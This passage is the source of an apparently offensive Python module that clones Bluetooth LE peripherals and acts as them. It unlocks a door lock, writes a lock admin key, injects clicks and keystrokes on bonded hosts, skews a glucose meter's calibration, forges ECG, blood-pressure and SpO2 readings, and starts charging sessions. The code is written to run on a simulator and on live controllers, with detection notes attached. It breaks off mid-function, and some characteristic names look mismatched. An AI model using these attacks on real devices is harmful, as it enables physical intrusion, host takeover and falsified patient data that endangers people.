"""The peripheral wave: be the thing, not just the name.

An advertisement is a claim about identity, and almost every product on a floor believes
the claim: the speaker a phone meets again in the lift, the lock whose neighbour answers
first, the charger that starts a session because the address matches the one on its
allow-list, the patient monitor whose telemetry a ward reads without looking at the
serial number.

This wave is twenty-five of those devices turned into attacks.  Each one copies a
peripheral's identity the way a real clone has to — its address, its name, the service
UUIDs it advertises, often the manufacturer's own payload — and then does the one thing
that device exists to do: a mouse clicks, a lock opens, a charger charges, a printer
prints, a monitor reports a number, a beacon answers as the beacon it copied.

Two techniques do the work, and both are read back rather than asserted:

* **the write** — a control characteristic is written and then *read back*, so the
  report quotes the value the device kept, and an ATT refusal keeps the error code the
  peer chose (``Insufficient Authentication`` is a result too);
* **the notification** — a peripheral speaks to its client, so a clone sends the
  measurement PDU a real device would send and the simulated host's own record of what
  it received is what the report prints, beside the value the real device would have
  sent.

Everything runs against :mod:`wifipilot.blesim` in demo mode with real HCI commands and
real ATT exchanges, and against a real controller live, where the reconnection count is
what the operator's own hardware does rather than what this tool claims about them.
"""

from __future__ import annotations

import struct
from typing import Any, Dict, List, Sequence, Tuple

from .. import blesim, bt
from ..models import AccessPoint
from .base import AttackContext, AttackOutcome
from .blemimic import _Mimic
from .blehid import _att_exchange, _att_read, _att_write, _enumerate

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY"]


def notification_pdu(handle: int, value: bytes, indication: bool = False) -> bytes:
    """The PDU a peripheral sends its client: the measurement, unprompted."""
    return bytes([0x1D if indication else 0x1B]) + struct.pack("<H", handle) + bytes(value)


def l2cap_exchange(sock: Any, link: Any, psm: int, payload: bytes) -> Tuple[bytes, Dict[str, Any]]:
    """Open a dynamic channel for ``psm`` and send one profile frame down it.

    An audio link is not ATT: it is an L2CAP channel opened for AVDTP (0x0019) or AVCTP
    (0x0017), and the profile's own first frame goes on it.  The channel is opened the way
    a client opens it and the answer is read off the ACL packet that comes back.
    """
    if sock is None or link is None:
        return b"", {}
    signalling = bytes([0x02, 0x01, 0x04, 0x00]) + struct.pack("<H", psm)
    try:
        answer = bt.hci_send(sock, bt.acl_packet(link.handle, bt.l2cap_frame(0x0001, signalling)),
                             timeout=1.0)
    except Exception:                                             # pragma: no cover
        return b"", {}
    body = (bt.parse_acl_packet(answer or b"").get("l2cap") or {}).get("payload") or b""
    dcid = int.from_bytes(body[4:6], "little") if len(body) >= 6 else 0
    if not dcid:
        return b"", {}
    try:
        answer = bt.hci_send(sock, bt.acl_packet(link.handle, bt.l2cap_frame(dcid, payload)),
                             timeout=1.0)
    except Exception:                                             # pragma: no cover
        return b"", {}
    parsed = bt.parse_acl_packet(answer or b"")
    return (parsed.get("l2cap") or {}).get("payload") or b"", parsed


class _Peripheral(_Mimic):
    """Clone one peripheral's identity, then do what that peripheral is for."""

    def __init_subclass__(cls, **kwargs: Any) -> None:
        """The class's own first line is the description the catalogue shows.

        Every attack in this wave documents itself at the top; the catalogue, the CLI,
        the web UI and the LLM prompt all read ``cls.description``, and a wave that wrote
        the same sentence twice would drift apart in the second copy.
        """
        super().__init_subclass__(**kwargs)
        if not cls.__dict__.get("description"):
            summary = (cls.__doc__ or "").strip().split("\n\n")[0]
            cls.description = " ".join(summary.split())


    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    role = "bonded"
    #: the simulated device to copy
    target = ""
    #: the bonded peripheral name to copy, when the attack is about a host's own device
    peer = ""
    services: Tuple[int, ...] = ()
    company_id = 0x0006
    manufacturer = b""

    # -- identity ---------------------------------------------------------- #

    def copied(self, ctx: AttackContext) -> Any:
        """The simulated device this run copies: by name, else the role's first fit."""
        airspace = self.floor()
        if self.target:
            device = airspace.by_name(self.target)
            if device is not None:
                return device
        return airspace.pick(self.role)

    def identity(self, ctx: AttackContext) -> Tuple[str, str, Any]:
        """The name, the address and the device the clone takes over.

        A bonded peripheral is copied the way a host remembers it — the name *and* the
        address the host wrote down — which is what makes the hosts reconnect.  A device
        nobody has bonded to is copied under its own name and address from the floor.
        """
        if self.peer:
            name, address = self.identity_of(self.peer)
            device = self.floor().by_address(address) or self.copied(ctx)
            return name, address, device
        device = self.copied(ctx)
        if device is None:
            return self.target or "wp-peripheral", "", None
        return device.name or self.target, device.address, device

    # -- the two techniques -------------------------------------------------- #

    def row_for(self, device: Any, uuid: int = 0, like: str = "") -> Dict[str, Any]:
        """A row of the device's own attribute table: by UUID, by name, else the first."""
        rows = device.gatt_rows() if device is not None else []
        if uuid:
            for row in rows:
                if int(row.get("uuid") or 0) == int(uuid):
                    return row
        if like:
            needle = like.lower()
            for row in rows:
                if needle in str(row.get("name") or "").lower():
                    return row
        for row in rows:
            if row.get("writable") and row.get("value") is not None:
                return row
        for row in rows:
            if row.get("value") is not None:
                return row
        return rows[0] if rows else {}

    def link_of(self, ctx: AttackContext, device: Any, role: str = "") -> Any:
        """A link to the device this run is about, with a socket to carry it."""
        address = getattr(device, "address", "") if device is not None else ""
        sock = blesim.controller_socket(None, address=address, role=role or self.role)
        return sock, self.floor().link_for(address, role or self.role)

    def act(self, ctx: AttackContext, value: bytes, uuid: int = 0, like: str = "",
            command: bool = False) -> Dict[str, Any]:
        """Write a control characteristic and read back what the device kept."""
        device = self.copied(ctx)
        row = self.row_for(device, uuid, like)
        handle = int(row.get("handle") or 0)
        acted = int(row.get("uuid") or 0)
        if not handle:
            return {"accepted": False, "error": "the device serves no characteristic"}
        sock, link = self.link_of(ctx, device)
        write = _att_write(sock, link, handle, value, command=command)
        raw, parsed = _att_read(sock, link, handle)
        return {"technique": "write", "uuid": f"0x{acted:04x}",
                "characteristic": row.get("name") or "", "handle": f"0x{handle:04x}",
                "sent": value.hex(), "accepted": bool(write.get("accepted")),
                "error": write.get("error", ""), "read_back": raw.hex() if raw else "",
                "text": raw.decode("latin-1", "replace") if raw else "",
                "refused": parsed.get("error_text", "") if not raw else "",
                "confirmed": bool(raw) and bytes(raw) == bytes(value),
                "refusals_on_the_link": int(getattr(link, "att_refusals", 0) or 0)}

    def inject(self, ctx: AttackContext, value: bytes, uuid: int = 0, like: str = "",
               indication: bool = False) -> Dict[str, Any]:
        """Send the client the measurement a real device would send, and read it back.

        A notification is not a request: the host does not answer it and cannot tell it
        from the real device's, which is exactly why the record of what the host received
        is the honest evidence here — plus the value the real device would have sent.
        """
        device = self.copied(ctx)
        row = self.row_for(device, uuid, like)
        handle = int(row.get("handle") or 0)
        if not handle:
            return {"technique": "notification", "accepted": False,
                    "error": "the device serves no characteristic"}
        sock, link = self.link_of(ctx, device)
        _payload, _parsed = _att_exchange(sock, link,
                                         notification_pdu(handle, value, indication))
        received = [dict(entry) for entry in getattr(link, "notifications", [])]
        return {"technique": "notification" if not indication else "indication",
                "uuid": f"0x{int(row.get('uuid') or 0):04x}",
                "characteristic": row.get("name") or "", "handle": f"0x{handle:04x}",
                "sent": value.hex(), "accepted": bool(received),
                "received_by_the_host": received[-1] if received else {},
                "host_received": len(received),
                "device_own_value": (row.get("value") or b"").hex(),
                "device_own_text": (row.get("value") or b"").decode("latin-1", "replace"),
                "error": "" if received else "the link is not up"}

    def read(self, ctx: AttackContext, uuid: int = 0, like: str = "") -> Dict[str, Any]:
        """Read a characteristic of the device this run is about."""
        device = self.copied(ctx)
        row = self.row_for(device, uuid, like)
        handle = int(row.get("handle") or 0)
        if not handle:
            return {"value": "", "error": "no such characteristic"}
        sock, link = self.link_of(ctx, device)
        raw, parsed = _att_read(sock, link, handle)
        if not raw and int(row.get("uuid") or 0):
            # a gated read is answered with Insufficient Authentication.  The attribute
            # table is still reachable the way a client enumerates it — Read By Type —
            # and that is the difference between "this device refuses me" and "nothing
            # came back", which the report has to keep apart
            request = bytes([0x08]) + struct.pack("<HHH", handle, handle, int(row["uuid"]))
            pdu, _answer = _att_exchange(sock, link, request)
            if pdu[:1] == bytes([0x09]) and len(pdu) > 4:
                raw = bytes(pdu[4:])
                parsed = {"source": "0x08", "read_by_type": True}
        return {"uuid": f"0x{int(row.get('uuid') or 0):04x}",
                "characteristic": row.get("name") or "", "handle": f"0x{handle:04x}",
                "value": raw.hex() if raw else "", "bytes": len(raw or b""),
                "text": raw.decode("latin-1", "replace") if raw else "",
                "error": parsed.get("error_text", "") if not raw else "",
                "read_by_type": bool(raw) and parsed.get("read_by_type") is True}

    def read_identity(self, ctx: AttackContext) -> Dict[str, str]:
        """The device's own information block: what a clone reads to be convincing."""
        wanted = (("manufacturer", 0x2A29), ("model", 0x2A24), ("firmware", 0x2A26),
                  ("serial", 0x2A25), ("name", 0x2A00))
        found: Dict[str, str] = {}
        for label, uuid in wanted:
            row = self.read(ctx, uuid)
            if row.get("text"):
                found[label] = row["text"]
        return found

    # -- the run ------------------------------------------------------------ #

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        """What the clone does once the identity is on the air.  The subclasses fill this."""
        return {}

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        name, address, device = self.identity(ctx)
        services = self.services or (tuple(int(row["uuid"]) for row in device.gatt_rows()
                                           if row.get("kind") == "service") if device else ())
        result = self.impersonate(ctx, name, address, services=services,
                                  manufacturer=self.manufacturer, company_id=self.company_id)
        try:
            capability = self.capability(ctx, device)
        except Exception as exc:                                     # pragma: no cover
            capability = {"accepted": False, "error": f"{type(exc).__name__}: {exc}"}
        extra = {"identity": {"name": name, "address": address,
                              "device": getattr(device, "device", ""),
                              "model": getattr(device, "model", ""),
                              "company": getattr(device, "company", ""),
                              "self_reported": self.read_identity(ctx)},
                 "advertised": result.get("advertised", {}),
                 "reconnected": result.get("reconnected", []),
                 "refused": result.get("refused", []),
                 "capability": capability, "simulated": bool(getattr(ctx, "demo", False))}
        action = capability.get("action") or self.label.split("(")[0].strip()
        reconnected = len(result.get("reconnected") or [])
        cloned = name or getattr(device, "name", "") or address
        initial = (extra["identity"]["company"] or " ")[0].lower()
        article = "an" if initial in "aeiou" else "a"
        lander = " ".join(part for part in (capability.get("characteristic"),
                                            capability.get("handle")) if part)
        if capability.get("accepted"):
            title = f"{action}: accepted"
            detail = (f"cloned {cloned}"
                      + (f" ({address})" if address and address != cloned else "")
                      + (f", {article} {extra['identity']['company']} "
                         f"{extra['identity']['model']}"
                         if extra["identity"]["model"] else "")
                      + (f"; {reconnected} host(s) connected to the clone" if reconnected else "")
                      + f"; {capability.get('technique')}"
                      + (f" on {lander}" if lander else "")
                      + (f" read back as {capability.get('text')!r}"
                         if capability.get("technique") == "write" and capability.get("text")
                         else "")
                      + (f", received by the host as "
                         f"{(capability.get('received_by_the_host') or {}).get('text', '')!r}"
                         if capability.get("received_by_the_host") else ""))
            return self._report(ctx, ap, attempt, title, detail, extra,
                                severity=self.finding_severity)
        title = f"{action}: refused"
        detail = (f"cloned {cloned}"
                  + (f" ({address})" if address and address != cloned else "")
                  + (f"; {reconnected} host(s) connected" if reconnected else "")
                  + f"; the {capability.get('technique') or 'capability'} was answered with "
                    f"{capability.get('refused') or capability.get('error') or 'nothing'}"
                  + (f"; {len(result.get('refused') or [])} host(s) asked for the link key"
                     if result.get("refused") else ""))
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


# --------------------------------------------------------------------------- #
# the peripherals
# --------------------------------------------------------------------------- #


class BleMouseMimicAttack(_Peripheral):
    """Clone the mouse a desk is bonded to and click on the host that accepts it."""

    name = "ble_mouse_mimic"
    label = "BLE mouse mimic (clone the mouse, click on the host)"
    tool = "wifipilot bt.py (HID reports over GATT) + blesim"
    role = "hid"
    peer = "WF-KEYBOARD"
    services = (0x1812,)
    company_id = 0x0006
    manufacturer = b"\x01\x02"
    finding_severity = "critical"
    devices = ("bt_keyboard", "windows_server", "linux_server", "smartphone")
    detection = ("Pointer movement with nobody at the desk: the host logs HID reports on "
                 "a reconnected link, and the device list shows two devices with one "
                 "address.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        reports = [bt.hid_input_report(bytes([0x01, 0x00, 0x00, 0x00])),   # button 1
                   bt.hid_input_report(bytes([0x00, 0x02, 0x00, 0x04]))]
        name, address, device = self.identity(ctx)
        deliveries: List[Dict[str, Any]] = []
        sock = self.socket(ctx)
        link = getattr(getattr(sock, "controller", None), "link", None)
        for entry in self.floor().devices:
            if getattr(entry, "bond_peer", "") != self.peer:
                continue
            link = self.floor().link_for(entry.address, "hid")
            handles = self.floor().hid_handles(entry)
            delivery = self.deliver(ctx, blesim.controller_socket(None, address=entry.address,
                                                                  role="hid"),
                                    link, handles[0] if handles else 0, reports, "click")
            deliveries.append({"host": entry.name or entry.address,
                               "address": entry.address, **delivery})
        clicks = sum(int(row.get("accepted") or 0) for row in deliveries)
        hosts = sum(1 for row in deliveries if int(row.get("accepted") or 0))
        return {"accepted": clicks > 0, "technique": "hid reports",
                "action": f"pointer reports ({clicks} click(s) accepted on {hosts} host(s))",
                "deliveries": deliveries, "reports_sent": len(reports), "hosts_reached": hosts}


class BleComboDongleMimicAttack(_Peripheral):
    """Clone a combo receiver and press the consumer keys on it — no prompt, no presence."""

    name = "ble_combo_dongle_mimic"
    label = "BLE combo dongle mimic (consumer keys on a bonded receiver)"
    tool = "wifipilot bt.py (HID reports over GATT) + blesim"
    role = "hid"
    peer = "WF-KEYBOARD"
    services = (0x1812,)
    finding_severity = "high"
    devices = ("bt_keyboard", "bt_headset", "windows_server", "linux_server")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        keys = [0xE9, 0xEA, 0xE2, 0xB5]               # volume up, down, mute, next track
        reports = [bt.hid_input_report(bytes([0x00, 0x00]) + bytes([key, 0x00, 0x00]))
                   for key in keys]
        deliveries: List[Dict[str, Any]] = []
        for entry in self.floor().devices:
            if getattr(entry, "bond_peer", "") != self.peer:
                continue
            link = self.floor().link_for(entry.address, "hid")
            handles = self.floor().hid_handles(entry)
            delivery = self.deliver(ctx, blesim.controller_socket(None, address=entry.address,
                                                                  role="hid"),
                                    link, handles[0] if handles else 0, reports, "media")
            deliveries.append({"host": entry.name or entry.address,
                               "address": entry.address, **delivery})
        accepted = sum(int(row.get("accepted") or 0) for row in deliveries)
        hosts = sum(1 for row in deliveries if int(row.get("accepted") or 0))
        return {"accepted": accepted > 0, "technique": "hid reports",
                "action": f"consumer key presses ({accepted} accepted on {hosts} host(s))",
                "keys": keys, "deliveries": deliveries, "hosts_reached": hosts}


class BleLockMimicAttack(_Peripheral):
    """Clone a door lock and send the unlock command it already trusts."""

    name = "ble_lock_mimic"
    label = "BLE lock mimic (clone the lock, take the unlock command)"
    tool = "wifipilot bt.py (vendor ATT write) + blesim"
    role = "gatt"
    services = (0xFEE7, 0x180F)
    finding_severity = "critical"
    devices = ("bt_lock", "smart_lock", "ble_sensor", "switch")
    target = "LOCK-FRONT"
    detection = ("An unlock with no credential presented: the lock's own audit trail shows "
                 "a locked-to-unlocked transition on a link it did not pair with.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        before = self.read(ctx, like="Lock State")
        unlocked = self.act(ctx, bytes([0x02, 0x00, 0x00, 0x00]), like="Lock Control")
        unlocked["action"] = "unlock write to the lock-control characteristic"
        unlocked["state_before"] = before.get("text", "") or before.get("value", "")
        unlocked["state_after"] = self.read(ctx, like="Lock State").get("value", "")
        return unlocked


class BleLockMeshMimicAttack(_Peripheral):
    """Clone a networked lock and write the admin key through its own characteristic."""

    name = "ble_lock_mesh_mimic"
    label = "BLE lock admin mimic (write the admin key on a networked lock)"
    tool = "wifipilot bt.py (vendor ATT write) + blesim"
    role = "gatt"
    services = (0xFEE7, 0x180F, 0x180A)
    finding_severity = "critical"
    devices = ("smart_lock", "bt_lock", "access_point", "ble_sensor")
    target = "Lock-Front-2"
    detection = ("An admin write from the lock's own address on a link with no pairing "
                 "record: the management platform sees a credential change it did not issue.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        result = self.act(ctx, b"WP-ADMIN-0001", like="Admin Key")
        result["action"] = "admin-key write"
        result["paired_peers"] = len(getattr(device, "bonds", {}) or {})
        return result


class BleBulbMimicAttack(_Peripheral):
    """Clone a smart bulb and drive the light: state follows whoever holds the address."""

    name = "ble_bulb_mimic"
    label = "BLE bulb mimic (clone the bulb, drive the light)"
    tool = "wifipilot bt.py (ATT write) + blesim"
    role = "gatt"
    services = (0x1815,)
    finding_severity = "medium"
    devices = ("smart_bulb", "smart_plug", "smart_speaker", "hvac")
    target = "Bulb-Kitchen"
    detection = ("A light that changes with no command from the controller: the bridge log "
                 "shows writes on a link it did not create.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        result = self.act(ctx, bytes([0xFF, 0x00, 0x40, 0x10]), like="Digital")
        result["action"] = "colour and brightness write (red, 64)"
        return result


class BleMeshLampMimicAttack(_Peripheral):
    """Clone a mesh lamp and send a provisioning PDU at its mesh service."""

    name = "ble_mesh_lamp_mimic"
    label = "BLE mesh node mimic (provisioning PDU at a mesh lamp)"
    tool = "wifipilot bt.py (ATT write) + blesim"
    role = "gatt"
    services = (0x1827, 0x1828)
    finding_severity = "high"
    devices = ("smart_bulb", "ble_sensor", "smart_plug", "gateway_hub")
    target = "Mesh-Lamp-3F"
    detection = ("A provisioning beacon from an address already in the mesh: the "
                 "provisioner's log shows an unprovisioned device where there should be a "
                 "managed node.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        result = self.act(ctx, bytes([0x03, 0x00, 0x01, 0x00, 0x00]), like="Provisioning Data In")
        result["action"] = "provisioning invite (mesh PDU 0x03)"
        return result


class BlePlugMimicAttack(_Peripheral):
    """Clone a smart plug and switch the load it controls."""

    name = "ble_plug_mimic"
    label = "BLE plug mimic (clone the plug, switch the load)"
    tool = "wifipilot bt.py (ATT write) + blesim"
    role = "gatt"
    services = (0xFEED, 0x180F)
    finding_severity = "high"
    devices = ("smart_plug", "bt_lock", "switch", "ups")
    target = "Plug-Washer"
    detection = ("A load that cycles with no schedule: the plug's cloud log shows state "
                 "changes from a device that reconnected under the plug's own address.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        result = self.act(ctx, bytes([0x01]), like="Motor Enable")
        result["action"] = "relay write (on)"
        result["speed_limit"] = self.read(ctx, like="Speed Limit").get("text", "")
        return result


class BleBandMimicAttack(_Peripheral):
    """Clone a fitness band and send the platform an activity record of our own."""

    name = "ble_band_mimic"
    label = "BLE fitness band mimic (clone the band, forge the activity data)"
    tool = "wifipilot bt.py (ATT notification) + blesim"
    role = "bonded"
    services = (0x180F, 0x1814)
    finding_severity = "high"
    devices = ("fitness_tracker", "smartphone", "tablet", "smart_tv")
    target = "Fit-Band 3"
    detection = ("Activity data with no gait behind it: the platform's ingest shows a "
                 "second device with the band's address and a session the wearer never "
                 "started.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        forged = bytes([0x00, 0x0C, 0x00, 0x40])       # RSC: speed 0x0c00, cadence 0x40
        result = self.inject(ctx, forged, uuid=0x2A53)
        result["action"] = f"activity-record notification ({forged.hex()})"
        return result


class BleThermostatMimicAttack(_Peripheral):
    """Clone a thermometer and notify the app of a temperature it did not measure."""

    name = "ble_thermostat_mimic"
    label = "BLE thermometer mimic (clone the sensor, send a forged measurement)"
    tool = "wifipilot bt.py (ATT indication) + blesim"
    role = "gatt"
    services = (0x1809, 0x180A)
    finding_severity = "high"
    devices = ("thermostat", "ble_sensor", "sensor", "hvac")
    target = "Thermo-4"
    detection = ("Readings with no measurement event: the app's history shows entries from "
                 "the device's address with no corresponding on-device measurement.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        forged = bytes([0x00, 0x6D, 0x01, 0x00, 0xFE, 0x07])   # 36.5 degC, 2026-10-16
        result = self.inject(ctx, forged, uuid=0x2A1C, indication=True)
        result["action"] = f"temperature indication ({forged.hex()})"
        return result


class BleScaleMimicAttack(_Peripheral):
    """Clone a scale and read the identity a fleet platform trusts it by."""

    name = "ble_scale_mimic"
    label = "BLE scale mimic (clone the scale, take its provisioning identity)"
    tool = "wifipilot bt.py (ATT reads) + blesim"
    role = "gatt"
    services = (0x181D, 0x180F)
    finding_severity = "medium"
    devices = ("sensor", "ble_sensor", "energy_meter", "ups")
    target = "Scale-500"

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        rows = getattr(device, "gatt_rows", lambda: [])()
        reads = [{"characteristic": row.get("name"), "uuid": f"0x{int(row['uuid']):04x}",
                  "text": (row.get("value") or b"").decode("latin-1", "replace")}
                 for row in rows if row.get("value")]
        return {"accepted": bool(reads), "technique": "read",
                "action": "scale identity read-back",
                "reads": reads,
                "writable_characteristics": len([row for row in rows if row.get("writable")])}


class BleGlucoseMimicAttack(_Peripheral):
    """Clone a meter and move its calibration: every later reading follows our offset."""

    name = "ble_glucose_mimic"
    label = "BLE glucose meter mimic (clone the meter, skew its calibration)"
    tool = "wifipilot bt.py (vendor ATT write) + blesim"
    role = "gatt"
    services = (0x1808, 0xFEF0)
    finding_severity = "critical"
    devices = ("medical_device", "ble_sensor", "smartphone", "tablet")
    target = "GlucoLink"
    detection = ("A calibrated medical device whose calibration changed out of hours, on a "
                 "link the meter's own log does not show as an operator session.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        result = self.act(ctx, bytes([0x02, 0x00, 0x64, 0x00, 0xC8]), like="Calibration Data")
        result["action"] = "calibration write (offset +200 mg/dL)"
        result["measurement"] = self.read(ctx, like="Glucose Measurement").get("text", "")
        return result


class BlePressureMimicAttack(_Peripheral):
    """Clone a blood-pressure cuff and indicate a reading the cuff never took."""

    name = "ble_pressure_mimic"
    label = "BLE blood-pressure mimic (clone the cuff, send a forged reading)"
    tool = "wifipilot bt.py (ATT indication) + blesim"
    role = "gatt"
    services = (0x1810, 0x180A)
    finding_severity = "critical"
    devices = ("medical_device", "smartphone", "tablet", "medical_workstation")
    target = "BP-7000"

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        forged = bytes([0x00, 0x78, 0x00, 0x50, 0x00, 0x50, 0x00, 0x6E, 0x01])
        result = self.inject(ctx, forged, uuid=0x2A35, indication=True)
        result["action"] = f"blood-pressure indication (120/80, {forged.hex()})"
        return result


class BleEcgMimicAttack(_Peripheral):
    """Clone an ECG patch and send the ward a rhythm of our choosing."""

    name = "ble_ecg_mimic"
    label = "BLE ECG patch mimic (clone the patch, send a forged rhythm)"
    tool = "wifipilot bt.py (ATT notification) + blesim"
    role = "gatt"
    services = (0x180D, 0x180A)
    finding_severity = "critical"
    devices = ("medical_device", "smartphone", "tablet", "medical_workstation")
    target = "ECG-Patch"

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        # flags 0x11: bit 0 says the measurement is 16-bit, bit 4 says the RR interval
        # follows — a value of 200 does not fit the 8-bit layout
        forged = bytes([0x11, 0xC8, 0x00])
        result = self.inject(ctx, forged, uuid=0x2A37)
        result["action"] = f"heart-rate notification (200 bpm, {forged.hex()})"
        return result


class BleHeartRateMimicAttack(_Peripheral):
    """Clone a chest strap and drive a training system's zone with it."""

    name = "ble_hr_mimic"
    label = "BLE heart-rate strap mimic (clone the strap, drive the zone)"
    tool = "wifipilot bt.py (ATT notification) + blesim"
    role = "gatt"
    services = (0x180D, 0x180F)
    finding_severity = "high"
    devices = ("fitness_tracker", "medical_device", "smartphone", "smart_tv")
    target = "HRM-Dual"

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        forged = bytes([0x00, 0xB4])                    # 180 bpm, flags 0
        result = self.inject(ctx, forged, uuid=0x2A37)
        result["action"] = f"heart-rate notification (180 bpm, {forged.hex()})"
        result["location"] = self.read(ctx, like="Body Sensor Location").get("text", "")
        return result


class BleAirQualityMimicAttack(_Peripheral):
    """Clone an air-quality monitor: the platform binds the reading to an identity."""

    name = "ble_air_quality_mimic"
    label = "BLE air-quality mimic (clone the monitor, take its identity)"
    tool = "wifipilot bt.py (device-information reads) + blesim"
    role = "gatt"
    services = (0x180A,)
    finding_severity = "high"
    devices = ("ble_sensor", "sensor", "thermostat", "hvac")
    target = "AirQ-2"
    detection = ("One sensor disagreeing with its neighbours: the platform's dashboard "
                 "shows a clean room beside dirty ones, both reporting from the same name.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        identity = self.read_identity(ctx)
        return {"accepted": bool(identity), "technique": "read",
                "action": "air-quality monitor identity read-back",
                "identity": identity,
                "writable_characteristics": len([row for row in device.gatt_rows()
                                                 if row.get("writable")]) if device else 0}


class BleChargerMimicAttack(_Peripheral):
    """Clone a charge point and start a session on somebody else's account."""

    name = "ble_charger_mimic"
    label = "BLE charge-point mimic (clone the charger, start a session)"
    tool = "wifipilot bt.py (vendor ATT write) + blesim"
    role = "gatt"
    services = (0xFFF0, 0x180A)
    finding_severity = "critical"
    devices = ("ev_charger", "bt_lock", "smart_plug", "energy_meter")
    target = "Charger-Bay1"
    detection = ("A session on a bay with no vehicle on it: the back-office record shows an "
                 "authorisation from the charger's own address.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        result = self.act(ctx, bytes([0x11, 0x01, 0x00, 0x05]), like="Start Stop")
        result["action"] = "start-session write (connector 1, 5 kWh)"
        result["charge_state"] = self.read(ctx, like="Charge State").get("text", "")
        return result


class BleLabelPrinterMimicAttack(_Peripheral):
    """Clone a label printer and take a print job meant for it."""

    name = "ble_label_printer_mimic"
    label = "BLE label printer mimic (clone the printer, take the job)"
    tool = "wifipilot bt.py (vendor ATT write) + blesim"
    role = "gatt"
    services = (0xFFB0, 0x180A)
    finding_severity = "high"
    devices = ("label_printer", "printer", "mfp_scanner", "bt_printer")
    target = "LabelPrinter-3"

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        job = b"\x1b\x40\x1b\x69\x61\x01WP-LABEL\n"
        result = self.act(ctx, job, like="Print Job")
        result["action"] = "print-job write (label buffer)"
        result["status"] = self.read(ctx, like="Print Status").get("text", "")
        result["ink"] = self.read(ctx, like="Ink Level").get("text", "")
        return result


class BleIrHubMimicAttack(_Peripheral):
    """Clone an IR hub and push a code into the transmitter that faces the room."""

    name = "ble_ir_hub_mimic"
    label = "BLE IR-hub mimic (clone the hub, send an IR command)"
    tool = "wifipilot bt.py (vendor ATT write) + blesim"
    role = "gatt"
    services = (0xFE40, 0x180A)
    finding_severity = "high"
    devices = ("gateway_hub", "smart_tv", "projector", "digital_signage")
    target = "IR-Hub-Lobby"
    detection = ("An IR transmission with no app command behind it: the hub's own log shows "
                 "a send from a link it did not create.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        command = bytes([0xA5, 0x0C, 0x00, 0x04]) + b"\x26\x00\x00\x00\x00\x00"
        result = self.act(ctx, command, like="IR Command")
        result["action"] = "IR send write (power toggle, NEC 0x26)"
        return result


class BleUwbAnchorMimicAttack(_Peripheral):
    """Clone a UWB anchor and write the range the location platform believes."""

    name = "ble_uwb_anchor_mimic"
    label = "BLE/UWB anchor mimic (clone the anchor, forge the range)"
    tool = "wifipilot bt.py (vendor ATT write) + blesim"
    role = "gatt"
    services = (0xFFE0, 0x180A)
    finding_severity = "high"
    devices = ("ble_sensor", "access_point", "gateway_hub", "wireless_controller")
    target = "Anchor-A"
    detection = ("A tag that moved without moving: the location platform shows a trajectory "
                 "that contradicts the door reader and the cameras.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        result = self.act(ctx, bytes([0x02, 0x00, 0x64]), like="Anchor Config")
        result["action"] = "range write (100 cm)"
        result["anchor_position"] = self.read(ctx, like="Anchor Position").get("text", "")
        return result


class BlePatientMonitorMimicAttack(_Peripheral):
    """Clone a patient monitor and notify the ward of a vital sign of our choosing."""

    name = "ble_patient_monitor_mimic"
    label = "BLE patient monitor mimic (clone the monitor, send a forged vital sign)"
    tool = "wifipilot bt.py (ATT notification) + blesim"
    role = "gatt"
    services = (0xFFA0, 0x180A)
    finding_severity = "critical"
    devices = ("medical_device", "tablet", "medical_workstation", "smartphone")
    target = "Telemetry-12"
    detection = ("A vital sign that disagrees with the bedside device: two monitors with "
                 "one address, and a chart that changed without an alarm.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        forged = bytes([0x63, 0x50, 0x00])              # SpO2 80%
        result = self.inject(ctx, forged, like="Reading")
        result["action"] = f"SpO2 notification (80%, {forged.hex()})"
        result["patient_id"] = self.read(ctx, like="Patient Id").get("text", "")
        return result


class BleVehicleTrackerMimicAttack(_Peripheral):
    """Clone a fleet tracker and write a position: the map follows the clone."""

    name = "ble_vehicle_tracker_mimic"
    label = "BLE vehicle tracker mimic (clone the tracker, forge the position)"
    tool = "wifipilot bt.py (vendor ATT write) + blesim"
    role = "gatt"
    services = (0xFFD0, 0x180A)
    finding_severity = "high"
    devices = ("ble_sensor", "ble_beacon", "energy_meter", "ups")
    target = "Van-Tracker"

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        position = bytes([0x00, 0x5C, 0x4E, 0x1C, 0x35, 0x0B, 0xAC, 0x35])
        result = self.act(ctx, position, like="Provisioning")
        result["action"] = "position write (51.5074 N, 0.1290 W)"
        result["telemetry"] = self.read(ctx, like="Telemetry Channel").get("text", "")
        return result


class BleVendingMimicAttack(_Peripheral):
    """Clone a vending telemetry unit: stock and sales are its identity, not its defence."""

    name = "ble_vending_mimic"
    label = "BLE vending mimic (clone the telemetry unit, take its identity)"
    tool = "wifipilot bt.py (ATT reads) + blesim"
    role = "gatt"
    services = (0x1800,)
    finding_severity = "medium"
    devices = ("pos_terminal", "kiosk", "printer", "digital_signage")
    target = "Vending-7"

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
